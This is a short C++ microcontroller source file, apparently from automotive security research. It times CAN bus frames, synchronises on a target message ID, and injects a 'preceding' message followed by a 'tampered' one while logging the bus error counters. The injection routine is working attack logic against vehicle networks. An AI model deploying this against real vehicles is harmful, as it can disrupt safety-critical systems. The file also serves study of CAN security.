#include "utils.h"


float msg_duration_micros(const uint32_t bps, const uint8_t dlc)
{

  constexpr uint8_t CAN_FRAME_OVH = 1 + 11 + 1 + 1 + 1 + 4 + 15 + 1 + 1 + 1 + 7 + 3;
  float bpus = bps / 1e9;
  auto frame_bits = CAN_FRAME_OVH + (dlc * 8);

  return frame_bits / bpus;
}

bool synchronise(uint16_t can_id, int max_tries)
{
  for (int tries = 0; tries < max_tries; tries++)
  {
    if (CAN.available() && CAN.read().id == can_id)
    {
      return true;
    }
  }
  return false;
}

void attack(CanMsg &preceding, CanMsg &tampered)
{
  // do not put serial prints in the middle of transmission since it could cause timing issues
  bool success_prec = (CAN.write(preceding) >= 0);
  bool success_tamp = (CAN.write(tampered) >= 0);
  if (success_prec)
  {
    Serial.println("Written preceding message with id " + String(preceding.id));
  }
  else
  {
    Serial.println("Failed to write preceding message");
  }
  if (success_tamp)
  {
    Serial.println("Written tampered message with id " + String(tampered.id));
  }
  else
  {
    Serial.println("Failed to write tampered message");
  }
}

void log_error_counters()
{
  // Direct register access since the library does not support them yet
  auto tec = *((volatile uint32_t *)TECR);
  auto rec = *((volatile uint32_t *)RECR);
  Serial.println("TEC:" + String(tec) + ",REC:" + String(rec));
}
